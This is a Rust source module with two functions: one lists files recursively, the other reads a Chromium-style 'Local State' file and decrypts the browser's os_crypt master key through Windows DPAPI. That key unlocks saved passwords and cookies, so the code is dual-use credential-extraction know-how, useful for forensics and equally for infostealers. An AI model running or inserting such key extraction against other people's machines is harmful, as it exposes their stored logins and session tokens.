use std::fs::File;
use std::io;
use std::io::{BufReader, Read};
use std::path::{Path, PathBuf};
use base64::Engine;
use base64::engine::general_purpose;
use walkdir::WalkDir;
use crate::decrypt::dpapi_crypt_unprotect_data;

pub fn get_files_recursive(dir_path: impl AsRef<Path>) -> io::Result<Vec<PathBuf>> {
    let mut file_paths: Vec<PathBuf> = Vec::new();
    for entry in WalkDir::new(dir_path).follow_links(true) {
        let entry = entry?;
        if entry.file_type().is_file() {
            file_paths.push(entry.path().to_path_buf());
        }
    }

    Ok(file_paths)
}

pub fn read_local_state(file_path: impl AsRef<Path>) -> Result<Vec<u8>, String> {
    let mut output: String = String::new();
    let file = File::open(file_path).map_err(|e| {
        e.to_string()
    })?;
    let mut reader = BufReader::new(file);
    reader.read_to_string(&mut output).map_err(|e| {
        e.to_string()
    })?;

    let obj: serde_json::Value = serde_json::from_str(output.as_str()).map_err(|e| {
        e.to_string()
    })?;

    let encoded_key = obj["os_crypt"]["encrypted_key"].as_str().ok_or(
        "Failed to get encoded key from Local State.".to_string()
    )?;

    let mut decoded_key = general_purpose::STANDARD
        .decode(encoded_key).map_err(|e| {
        e.to_string()
    }
    )?;


    let decoded_key = dpapi_crypt_unprotect_data(decoded_key[5..].to_vec())?;

    Ok(decoded_key)
}
